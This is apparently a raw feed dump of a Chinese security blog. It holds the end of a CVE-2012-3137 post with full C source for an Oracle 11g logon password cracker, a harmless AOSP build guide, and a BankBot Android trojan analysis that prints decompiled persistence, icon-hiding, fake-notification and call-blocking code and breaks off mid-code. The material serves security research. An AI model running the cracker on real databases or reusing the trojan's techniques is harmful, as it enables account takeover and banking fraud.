class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><br>    AES_KEY key;<br>    AES_set_encrypt_key(aes_key_bytes, <span class="hljs-number">192</span>, &amp;key);<br>    AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_ENCRYPT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">usage</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;o5logoncrack -k server sesskey -s salt -d dict\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br><br>    <span class="hljs-type">char</span> password [<span class="hljs-number">100</span>];<br>    <span class="hljs-type">char</span> aes_key_bytes[<span class="hljs-number">24</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> dict_filename[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Oracle_MixCaseHash[<span class="hljs-number">20</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> decrypted_server_sesskey[<span class="hljs-number">48</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> encrypted_server_sesskey[<span class="hljs-number">48</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> AUTH_SESSKEY[<span class="hljs-number">48</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> AUTH_VFR_DATA[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">int</span> debug = <span class="hljs-number">0</span>;<br>    FILE * fp = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-type">int</span> ch;<br>    <span class="hljs-type">int</span> args = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>( ( ch = getopt( argc, argv, <span class="hljs-string">&quot;k:s:d:v&quot;</span> ) ) != EOF ) &#123;<br>        <span class="hljs-keyword">switch</span>(ch) &#123;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;k&#x27;</span>:<br>            HexStringtoBinArray(optarg, AUTH_SESSKEY);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>            HexStringtoBinArray(optarg, AUTH_VFR_DATA);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>            <span class="hljs-built_in">strncpy</span>(dict_filename, optarg, <span class="hljs-number">255</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>            debug = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            usage();<br>        &#125;<br>        args++;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (args &lt; <span class="hljs-number">3</span>) usage();<br><br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;*************************************************************\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;Oracle 11g TNS AES-192 cracker by zz@nsfocus\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;*************************************************************\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> ( (fp = fopen(dict_filename, <span class="hljs-string">&quot;r&quot;</span>)) == <span class="hljs-literal">NULL</span> ) &#123;<br>        perror(<span class="hljs-string">&quot;fail to read&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>(fgets(password, <span class="hljs-number">100</span>, fp) != <span class="hljs-literal">NULL</span>) &#123;<br><br>        len = <span class="hljs-built_in">strlen</span>(password);<br>        <span class="hljs-keyword">if</span> (password[len<span class="hljs-number">-1</span>] == <span class="hljs-number">0xa</span> &amp;&amp; password[len<span class="hljs-number">-2</span>] == <span class="hljs-number">0xd</span>) &#123;<br>            password[len<span class="hljs-number">-2</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> password[len<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>        <span class="hljs-keyword">if</span> (debug)<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;try `%s&#x27;\n&quot;</span>, password);<br>        <span class="hljs-comment">// Create Oracle Hash from the salt (AUTH_VFR_DATA) and the password</span><br>        ORACLE_MixCase_Hash (password, <span class="hljs-built_in">strlen</span> (password), AUTH_VFR_DATA, Oracle_MixCaseHash);<br><br>        <span class="hljs-built_in">memset</span> (aes_key_bytes,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(aes_key_bytes));<br>        <span class="hljs-built_in">memcpy</span> (aes_key_bytes,Oracle_MixCaseHash, <span class="hljs-number">20</span>);<br><br>        <span class="hljs-keyword">if</span> (debug)<br>            hexdump(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;aes_key_bytes&quot;</span>, aes_key_bytes, <span class="hljs-keyword">sizeof</span>(aes_key_bytes));<br><br>        <span class="hljs-built_in">memset</span> (decrypted_server_sesskey, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(decrypted_server_sesskey));<br>        ORACLE_TNS_Decrypt_AES192_CBC (aes_key_bytes, AUTH_SESSKEY, <span class="hljs-number">48</span>, decrypted_server_sesskey);<br><br>        <span class="hljs-keyword">if</span> (debug)<br>            hexdump(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;decrypted_server_sesskey&quot;</span>, decrypted_server_sesskey, <span class="hljs-keyword">sizeof</span>(decrypted_server_sesskey));<br><br>        ret = <span class="hljs-built_in">strncmp</span>(&amp;decrypted_server_sesskey[<span class="hljs-number">40</span>], <span class="hljs-string">&quot;\x08\x08\x08\x08\x08\x08\x08\x08&quot;</span>, <span class="hljs-number">8</span>);<br><br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123; <br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;\nFound password: %s \n\n&quot;</span>, password);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">memset</span>(password, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(password));<br><br>    &#125;<br><br>    fclose(fp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012">http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012</a></li><li><a href="http://www.soonerorlater.hu/index.khtml?article_id=512">http://www.soonerorlater.hu/index.khtml?article_id=512</a></li><li><a href="http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol">http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol</a></li><li><a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137</a></li><li><a href="http://www.openwall.com/lists/john-users/2012/09/28/1">http://www.openwall.com/lists/john-users/2012/09/28/1</a></li><li><a href="http://marcel.vandewaters.nl/oracle/security/password-hashes">http://marcel.vandewaters.nl/oracle/security/password-hashes</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译 Android 系统源码  （AOSP）</title>
    <link href="/cn/compile_android_source_code/"/>
    <url>/cn/compile_android_source_code/</url>
    
    <content type="html"><![CDATA[<h2 id="☆-1-下载源码"><a href="#☆-1-下载源码" class="headerlink" title="☆ 1. 下载源码"></a>☆ 1. 下载源码</h2><p>由于众所周知的原因，国内访问 Android 源码不大方便， 清华大学做了一件好事， 弄了个 mirror。</p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/">https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/</a></p><h3 id="下载-repo"><a href="#下载-repo" class="headerlink" title="下载 repo"></a>下载 repo</h3><p>Google 自己搞一个源码同步工具，需要下下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> ~/bin<br>PATH=~/bin:<span class="hljs-variable">$PATH</span><br>curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo<br><span class="hljs-built_in">chmod</span> a+x ~/bin/repo<br></code></pre></td></tr></table></figure><p>上面命令，下载 repo  并将 ~&#x2F;bin 加入 PATH 环境变量</p><h3 id="使用每月更新的初始化包"><a href="#使用每月更新的初始化包" class="headerlink" title="使用每月更新的初始化包"></a>使用每月更新的初始化包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -c https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar <span class="hljs-comment"># 下载初始化包</span><br>tar xf aosp-latest.tar<br><span class="hljs-built_in">cd</span> AOSP   <span class="hljs-comment"># 解压得到的 AOSP 工程目录</span><br><span class="hljs-comment"># 这时 ls 的话什么也看不到，因为只有一个隐藏的 .repo 目录</span><br>repo <span class="hljs-built_in">sync</span> <span class="hljs-comment"># 正常同步一遍即可得到完整目录</span><br><span class="hljs-comment"># 或 repo sync -l 仅checkout代码</span><br></code></pre></td></tr></table></figure><p>使用这个初始包的好处挺多，应该可以减少一些网络 IO</p><h3 id="编译特定版本的-Android"><a href="#编译特定版本的-Android" class="headerlink" title="编译特定版本的 Android"></a>编译特定版本的 Android</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-4.0.1_r1<br>repo <span class="hljs-built_in">sync</span><br></code></pre></td></tr></table></figure><p>其中版本号的对应关系可以从这个页面获得：</p><p><a href="https://source.android.com/setup/start/build-numbers">https://source.android.com/setup/start/build-numbers</a></p><h3 id="下载对应设备的-Driver-Binary"><a href="#下载对应设备的-Driver-Binary" class="headerlink" title="下载对应设备的 Driver Binary"></a>下载对应设备的 Driver Binary</h3><p>Pixel 2 就直接可以看这个 <a href="https://developers.google.com/android/drivers#walleye">https://developers.google.com/android/drivers#walleye</a><br>目前最新的两个链接为：</p><ul><li><a href="https://dl.google.com/dl/android/aosp/google_devices-walleye-pq2a.190305.002-78f45eb0.tgz">https://dl.google.com/dl/android/aosp/google_devices-walleye-pq2a.190305.002-78f45eb0.tgz</a></li><li><a href="https://dl.google.com/dl/android/aosp/qcom-walleye-pq2a.190305.002-a7c70412.tgz">https://dl.google.com/dl/android/aosp/qcom-walleye-pq2a.190305.002-a7c70412.tgz</a></li></ul><p>将这两个文件在 aosp 根目录解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar zxvf google_devices-walleye-pq2a.190305.002-78f45eb0.tgz<br>tar zxvf qcom-walleye-pq2a.190305.002-a7c70412.tgz<br></code></pre></td></tr></table></figure><p>将得到两个文件 <code>extract-google_devices-walleye.sh</code> 和 <code>extract-qcom-walleye.sh</code><br>这两个文件为自解压文件，直接执行即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./extract-google_devices-walleye.sh<br>./extract-qcom-walleye.sh<br></code></pre></td></tr></table></figure><h2 id="☆-2-编译源码"><a href="#☆-2-编译源码" class="headerlink" title="☆ 2. 编译源码"></a>☆ 2. 编译源码</h2><p>切换到 aosp 根目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">make clobber<br><span class="hljs-built_in">source</span> build/envsetup.sh<br>lunch aosp_arm-eng<br>make -j4<br></code></pre></td></tr></table></figure><p>执行 lunch 可以看到支持的各种 build， 自行选择即可。<br>编译成功后，将在 <code>out/target/product/walleye/</code> 目录下生成镜像文件。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap">-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices  <span class="hljs-number"> 33554432 </span>3月  <span class="hljs-number"> 8 </span>01:55 boot.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices   <span class="hljs-number"> 8388608 </span>3月  <span class="hljs-number"> 7 </span>17:56 dtbo.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices   <span class="hljs-number"> 1570048 </span>3月  <span class="hljs-number"> 8 </span>01:55 ramdisk.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices   <span class="hljs-number"> 8721730 </span>3月  <span class="hljs-number"> 8 </span>01:55 ramdisk-recovery.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices<span class="hljs-number"> 1175523656 </span>3月  <span class="hljs-number"> 8 </span>02:17 system.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices  <span class="hljs-number"> 84722016 </span>3月  <span class="hljs-number"> 8 </span>02:15 system_other.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices   <span class="hljs-number"> 4952764 </span>3月  <span class="hljs-number"> 8 </span>01:28 userdata.img<br>-rw-rw-r--<span class="hljs-number"> 1 </span>henices henices      <span class="hljs-number"> 4096 </span>3月  <span class="hljs-number"> 8 </span>02:17 vbmeta.img<br>-rw-r--r--<span class="hljs-number"> 1 </span>henices henices <span class="hljs-number"> 369635536 </span>3月  <span class="hljs-number"> 7 </span>16:42 vendor.img<br></code></pre></td></tr></table></figure><h2 id="☆-3-注意事项"><a href="#☆-3-注意事项" class="headerlink" title="☆ 3. 注意事项"></a>☆ 3. 注意事项</h2><p>清华这个 mirror 是定时同步的，所以实时性并不好，如果遇到某个特定版本下载失败，<br>可以等待一段时间后，再重新执行同步命令。编译时需要的内存比较大，小内存可能导致编译失败，<br>另外，如果在虚拟机里编译的话，记得多设置几个CPU核，这样编译速度会快一些。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/">https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/</a></li><li><a href="https://source.android.com/setup/build/downloading">https://source.android.com/setup/build/downloading</a></li><li><a href="https://source.android.com/setup/build/building">https://source.android.com/setup/build/building</a></li><li><a href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bankbot APK 样本分析</title>
    <link href="/cn/BankBot/"/>
    <url>/cn/BankBot/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-样本概况"><a href="#0x00-样本概况" class="headerlink" title="0x00 样本概况"></a>0x00 样本概况</h2><table><thead><tr><th>字段</th><th>内容</th></tr></thead><tbody><tr><td>样本名</td><td>BankBot</td></tr><tr><td>MD5</td><td>3c42c391bec405bb28b28195c2961778</td></tr><tr><td>SHA256</td><td>93b64019ee48177889d908c393703a2a2fe05ca33793c14b175467ce619b1b94</td></tr><tr><td>文件类型</td><td>APK</td></tr></tbody></table><p>这是一个以盗窃信用卡用户密码为主要目的的bot。安装后显示为Android图标。打开App后<br>会以Android系统更新的形式，诱导用户操作达到常驻系统的目的。</p><h2 id="0x01-行为分析"><a href="#0x01-行为分析" class="headerlink" title="0x01 行为分析"></a>0x01 行为分析</h2><h3 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.android.market.Autorun&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span> <span class="hljs-attr">android:priority</span>=<span class="hljs-string">&quot;999&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span> <span class="hljs-attr">android:priority</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Autorun</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.android.market;<br><br><span class="hljs-keyword">import</span> android.content.BroadcastReceiver;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Autorun</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Autorun</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(context, Scheduler.class);<br>        v0.setFlags(<span class="hljs-number">0x10000000</span>);<br>        context.startService(v0);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>开机将启动 Schedule 服务</p><h3 id="Schedule-服务"><a href="#Schedule-服务" class="headerlink" title="Schedule 服务"></a>Schedule 服务</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">onStartCommand</span><span class="hljs-params">(Intent intent, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> startId)</span> &#123;<br>    <span class="hljs-built_in">super</span>.onStartCommand(intent, flags, startId);<br>    Utils.registerIfNeeded(((Context)<span class="hljs-built_in">this</span>));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getSystemService(<span class="hljs-string">&quot;alarm&quot;</span>);<br>    <span class="hljs-type">PendingIntent</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> PendingIntent.getBroadcast(((Context)<span class="hljs-built_in">this</span>), <span class="hljs-number">0</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(((Context)<span class="hljs-built_in">this</span>), <br>            NetworkController.class), <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">v7</span> <span class="hljs-operator">=</span> FileController.fileExists(((Context)<span class="hljs-built_in">this</span>), <span class="hljs-string">&quot;interval&quot;</span>) ? Integer.parseInt(FileController<br>            .readFile(((Context)<span class="hljs-built_in">this</span>), <span class="hljs-string">&quot;interval&quot;</span>)) : <span class="hljs-number">0xA</span>;<br>    ((AlarmManager)v0).setRepeating(<span class="hljs-number">0</span>, System.currentTimeMillis() + <span class="hljs-number">0x2710</span>, ((<span class="hljs-type">long</span>)(v7 * <span class="hljs-number">0x3E8</span>)), <br>            v6);<br>    <span class="hljs-built_in">this</span>.handleCrashes();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Schedule 服务使用alarm manager 注册一个定时任务。这个定时任务由NetworkController完成。<br>时间间隔由配置文件interval决定。</p><p>com.android.market.FileController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">fileExists</span><span class="hljs-params">(Context context, String filename)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(context.getFilesDir(), filename).exists();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="隐藏App-图标"><a href="#隐藏App-图标" class="headerlink" title="隐藏App 图标"></a>隐藏App 图标</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hideApp</span><span class="hljs-params">(Context context, <span class="hljs-type">boolean</span> hide)</span> &#123;<br>    <span class="hljs-type">ComponentName</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComponentName</span>(context.getPackageName(), String.valueOf(context.getPackageName())<br>             + <span class="hljs-string">&quot;.MainActivity&quot;</span>);<br>    <span class="hljs-type">PackageManager</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> context.getPackageManager();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> hide ? <span class="hljs-number">2</span> : <span class="hljs-number">1</span>;<br>    v3.setComponentEnabledSetting(v0, v1, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="伪造的系统Notification"><a href="#伪造的系统Notification" class="headerlink" title="伪造的系统Notification"></a>伪造的系统Notification</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">super</span>.onCreate();<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppCrash</span>().Register(((Context)<span class="hljs-built_in">this</span>));<br>    <span class="hljs-type">Notification</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notification</span>(<span class="hljs-number">0x108008A</span>, <span class="hljs-string">&quot;Android system requires user action&quot;</span>, System.<br>            currentTimeMillis());<br>    <span class="hljs-type">Intent</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>.getApplicationContext(), AdminX.class);<br>    v1.setAction(<span class="hljs-string">&quot;android.intent.action.VIEW&quot;</span>);<br>    v1.setFlags(<span class="hljs-number">0x34000000</span>);<br>    v3.setLatestEventInfo(<span class="hljs-built_in">this</span>.getBaseContext(), <span class="hljs-string">&quot;Android&quot;</span>, <span class="hljs-string">&quot;Android system requires action&quot;</span>, PendingIntent<br>            .getActivity(((Context)<span class="hljs-built_in">this</span>), <span class="hljs-number">0</span>, v1, <span class="hljs-number">0x8000000</span>));<br>    v3.flags |= <span class="hljs-number">0x62</span>;<br>    <span class="hljs-built_in">this</span>.startForeground(<span class="hljs-number">2</span>, v3);<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>(<span class="hljs-built_in">this</span>).execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Void</span>[<span class="hljs-number">0</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="禁用屏幕锁定"><a href="#禁用屏幕锁定" class="headerlink" title="禁用屏幕锁定"></a>禁用屏幕锁定</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AdminX.<span class="hljs-built_in">this</span>.getSystemService(<span class="hljs-string">&quot;keyguard&quot;</span>).newKeyguardLock(<span class="hljs-string">&quot;ANDROID&quot;</span>).disableKeyguard();<br></code></pre></td></tr></table></figure><h3 id="禁止拨打指定号码电话"><a href="#禁止拨打指定号码电话" class="headerlink" title="禁止拨打指定号码电话"></a>禁止拨打指定号码电话</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>    String[] v8;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> intent.getAction();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;state&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span 